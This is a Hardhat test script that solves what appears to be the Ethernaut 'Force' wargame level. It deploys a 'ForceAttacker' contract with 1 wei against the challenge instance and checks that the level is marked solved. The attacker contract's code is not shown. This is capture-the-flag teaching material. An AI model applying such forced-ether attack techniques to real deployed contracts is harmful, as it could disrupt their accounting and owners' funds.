import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Force`);
  const challengeAddress = await createChallenge(
    `0xb6c2Ec883DaAac76D8922519E63f875c2ec65575`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  const attackerFactory = await ethers.getContractFactory(`ForceAttacker`);
  attacker = await attackerFactory.deploy(challenge.target, {
    value: ethers.parseUnits(`1`, `wei`),
  });
  await attacker.waitForDeployment();
});

after(async () => {
  expect(await submitLevel(challenge.target as string), "level not solved").to.be.true;
});
